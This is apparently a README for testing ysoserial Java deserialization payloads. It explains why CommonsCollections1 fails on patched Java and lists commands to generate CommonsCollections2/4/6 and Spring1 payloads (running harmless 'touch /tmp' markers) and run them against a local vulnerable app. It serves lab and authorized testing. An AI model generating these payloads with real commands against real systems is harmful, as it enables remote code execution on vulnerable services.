# YSOSerial Payload Testing

## Java Version Compatibility Issue

**IMPORTANT**: CommonsCollections1 has VERY strict version requirements!

The error you're seeing:

```
java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet
```

This happens because CommonsCollections1 relies on `AnnotationInvocationHandler` behavior that was patched in:

- **Java 8u71+** (Your Java 8u472 is too new!)
- Java 7u80+
- All Java 9+ versions

**Required for CommonsCollections1**: Java 7u21 or Java 8u65 or earlier

See: `src/main/java/ysoserial/payloads/util/JavaVersion.java:33`

## Solutions

### Option 1: Use URLDNS Payload (Works on ALL Java versions)

URLDNS is the most universal payload - it works on **any Java version** including Java 11:

```bash
# Test URLDNS (DNS exfiltration - no command execution)
./test-payload/test-urldns.sh
```

**What it does**: Triggers a DNS lookup when deserialized (useful for detection/testing)

**Pros**:

- ✓ Works on all Java versions
- ✓ No dependencies required
- ✓ Great for testing if deserialization is happening

**Cons**:

- ✗ Does NOT execute commands (only DNS lookup)

### Option 2: Use Other Payloads That Work on Java 11

Some payloads work on newer Java versions (requires specific libraries):

```bash
# CommonsCollections2 (requires commons-collections4:4.0)
./ysoserial.sh CommonsCollections2 "touch /tmp/cc2-pwned" > payload.ser

# CommonsCollections4 (requires commons-collections4:4.0)
./ysoserial.sh CommonsCollections4 "touch /tmp/cc4-pwned" > payload.ser

# CommonsCollections6 (requires commons-collections:3.1)
./ysoserial.sh CommonsCollections6 "touch /tmp/cc6-pwned" > payload.ser

# Spring1 (requires Spring libraries)
./ysoserial.sh Spring1 "touch /tmp/spring-pwned" > payload.ser
```

### Option 3: Install Java 8 (Older Version)

To test CommonsCollections1 specifically, you need Java 8u65 or earlier:

```bash
# Install Java 8 (example for Arch Linux)
yay -S jdk8-openjdk

# Modify test script to use Java 8
# Edit: test-payload/test-cc1.sh
# Change: /usr/lib/jvm/java-11-openjdk
# To:     /usr/lib/jvm/java-8-openjdk
```

## Manual Testing

### Step 1: Generate Payload

```bash
./ysoserial.sh <PayloadType> "<command>" > payload.ser
```

### Step 2: Compile Test App

```bash
javac -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar test-payload/VulnerableApp.java
```

### Step 3: Test Deserialization

```bash
java -cp test-payload:target/ysoserial-0.0.6-SNAPSHOT-all.jar VulnerableApp payload.ser
```

## Understanding the Error

Your Java 11 environment is correctly **blocking** the CommonsCollections1 exploit:

```
src/main/java/ysoserial/payloads/CommonsCollections1.java:84-86
```

The `isApplicableJavaVersion()` check exists because Oracle/OpenJDK patched this vulnerability years ago.

## Recommendations for Testing

1. **For CTF/Lab Testing**: Use URLDNS to confirm deserialization works, then try other payloads
2. **For Real Pentesting**: Check target Java version and available libraries first
3. **For Learning**: Install Java 8 to see CommonsCollections1 work historically

## Security Note

These tools are for:

- ✓ Authorized penetration testing
- ✓ CTF challenges
- ✓ Security research
- ✓ Educational purposes

⚠️ **Never use on systems without explicit authorization**
